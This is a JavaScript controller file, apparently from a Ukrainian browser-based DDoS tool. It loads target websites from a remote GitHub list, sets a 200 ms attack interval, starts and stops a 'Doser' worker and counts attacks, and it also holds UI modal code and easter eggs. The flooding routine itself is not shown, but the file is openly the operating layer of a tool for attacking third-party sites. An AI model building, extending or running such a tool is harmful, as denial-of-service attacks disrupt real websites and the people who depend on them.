// Звідси будуть завантажуватись цілі
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json'

const saverInterval = 3000
const attackInterval = 200

// Функції для керування документом

const frameDiv = $("#frames")
const attacks = $("#attacks")

const add_count = () => attacks.text(parseInt(attacks.text()) + 1)


// Відображення цілі та методу атаки
const targetField = $("#target")
const methodField = $("#method")

// https://github.com/BogdanDevUA/simple-ddos/


const btn = $("#button-text")
const Database = window.localStorage
const box = $("#box")


Doser = new Doser; // Ініціалізація воркера

$("#button").click(() => !Doser.attack ? Doser.start() : Doser.stop());

$("#attackCount").click(() => {
	// Загальна кількість атак

	const a = Database.attacks
	alert("Атаки", `Взагалом атаковано: ${!a?0:a}`)
});

// Пасхалки)

$("#fixed-bugs").click(() => alert("Факт", "Я справді пофіксив баги!"));

$("#uses").click(() => alert("Пасхалка", "Цей сайт був написаний 13 річним хакером на JS, HTML, CSS"));

$("#ua").dblclick(() => alert("Слава Україні!", "Героям Слава!"));

function topNav() {
    var x = document.getElementById("myTopnav");
    if (x.className === "topnav") {
        x.className += " responsive";
    } else {
        x.className = "topnav";
    }
}

let modal = $('#modalBox').element;
let close = $("#close");

function alert(header='Повідомлення', text) {
    clearModal();
    $("#modal-header #header").text(header)
    let modalText = $("#modal-body #text")

    for (let p of text.split("||")) {
        $("<p>", {}).text(p).appendTo(modalText)
    }

    modal.style.display = "block";
}

clearModal = () => document.querySelectorAll("#header, #text p").forEach(e => e.textContent='')

close.click(() => {modal.style.display = "none"; clearModal()})

window.onclick = e => {
    if (e.target == modal) {
        clearModal();
        modal.style.display = "none";
    }
}

// Слава Україні!